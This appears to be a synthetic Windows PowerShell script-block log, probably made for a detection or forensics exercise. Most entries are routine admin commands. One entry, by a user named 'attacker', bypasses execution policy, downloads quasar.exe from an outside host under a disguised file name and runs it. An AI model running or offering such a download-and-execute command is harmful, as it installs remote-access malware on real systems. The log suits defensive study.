@@ -1,0 +1,385 @@
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:40:03
+Record ID: 98760
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1002
+UserName: admin
+
+ScriptBlock:
+Get-Service | Where-Object { $_.Status -eq 'Stopped' }
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:41:25
+Record ID: 98761
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1002
+UserName: admin
+
+ScriptBlock:
+Get-EventLog -LogName Security -Newest 20
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:42:47
+Record ID: 98762
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1003
+UserName: user
+
+ScriptBlock:
+Set-ExecutionPolicy RemoteSigned
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:43:59
+Record ID: 98763
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1004
+UserName: developer
+
+ScriptBlock:
+Get-Process | Sort-Object -Property CPU -Descending
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:44:15
+Record ID: 98764
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1005
+UserName: support
+
+ScriptBlock:
+Get-Help Invoke-WebRequest
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:45:45
+Record ID: 98766
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1002
+UserName: admin
+
+ScriptBlock:
+Get-ChildItem -Path C:\\Windows\\System32 -Recurse
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:46:03
+Record ID: 98767
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1006
+UserName: it-support
+
+ScriptBlock:
+New-Item -Path "C:\\Test" -ItemType "directory"
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:47:12
+Record ID: 98768
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1004
+UserName: developer
+
+ScriptBlock:
+Set-Location -Path 'C:\\Projects\\'
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:48:32
+Record ID: 98769
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1003
+UserName: user
+
+ScriptBlock:
+Get-FileHash -Algorithm SHA256 C:\\important-file.txt
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:49:22
+Record ID: 98770
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1002
+UserName: admin
+
+ScriptBlock:
+Get-History
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:50:11
+Record ID: 98771
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1005
+UserName: support
+
+ScriptBlock:
+Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' }
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:50:45
+Record ID: 98772
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1006
+UserName: it-support
+
+ScriptBlock:
+New-Item -Path "C:\\Test\\log.txt" -ItemType "file"
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:51:03
+Record ID: 98773
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1004
+UserName: developer
+
+ScriptBlock:
+Get-Content C:\\Projects\\report.docx | Measure-Object -Word
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:52:10
+Record ID: 98774
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1003
+UserName: user
+
+ScriptBlock:
+Invoke-WebRequest -Uri 'https://company-internal-server.com' -Method GET
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:52:22
+Record ID: 98765
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1001
+UserName: attacker
+
+ScriptBlock:
+powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('http://pepaya-mangga-pisang-jambu.com/quasar.exe', 'C:\\Users\\Public\\network-util-reg.exe'); Start-Process 'C:\\Users\\Public\\network-util-reg.exe'"
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:52:55
+Record ID: 98775
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1002
+UserName: admin
+
+ScriptBlock:
+Stop-Service -Name Spooler
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:53:20
+Record ID: 98776
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1004
+UserName: developer
+
+ScriptBlock:
+Get-Content -Path 'C:\\Projects\\code.ps1'
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:54:14
+Record ID: 98777
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-345678901
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:54:15
+Record ID: 98778
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1003
+UserName: user
+
+ScriptBlock:
+Get-ChildItem C:\\Users\\user\\Documents -Recurse | Out-File -FilePath C:\\Users\\user\\output.txt
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:55:07
+Record ID: 98779
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1005
+UserName: support
+
+ScriptBlock:
+Get-Process | Where-Object { $_.Name -like 'chrome' }
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:56:20
+Record ID: 98780
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1006
+UserName: it-support
+
+ScriptBlock:
+Get-Service -Name 'Spooler' | Stop-Service
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:57:14
+Record ID: 98781
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1002
+UserName: admin
+
+ScriptBlock:
+New-Item -Path "C:\\TestFolder" -ItemType "directory"
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:58:35
+Record ID: 98782
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1004
+UserName: developer
+
+ScriptBlock:
+Set-ExecutionPolicy Unrestricted
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 14:59:12
+Record ID: 98783
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1002
+UserName: admin
+
+ScriptBlock:
+Remove-Item -Path 'C:\\Test\\output.txt'
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 15:00:48
+Record ID: 98784
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1005
+UserName: support
+
+ScriptBlock:
+Get-Service | Where-Object { $_.Status -eq 'Running' }
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 15:01:33
+Record ID: 98785
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1003
+UserName: user
+
+ScriptBlock:
+Get-Content C:\\Users\\user\\Desktop\\log.txt
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 15:02:12
+Record ID: 98786
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1006
+UserName: it-support
+
+ScriptBlock:
+Get-EventLog -LogName System -Newest 50
+
+---
+
+EventID: 4104
+ProviderName: Microsoft-Windows-PowerShell
+TimeCreated: 10/07/2024 15:03:23
+Record ID: 98787
+Channel: Microsoft-Windows-PowerShell/Operational
+Computer: COMP01
+UserID: S-1-5-21-1234567890-2345678901-3456789012-1002
+UserName: admin
+
+ScriptBlock:
+Set-Location -Path C:\\Windows\\System32
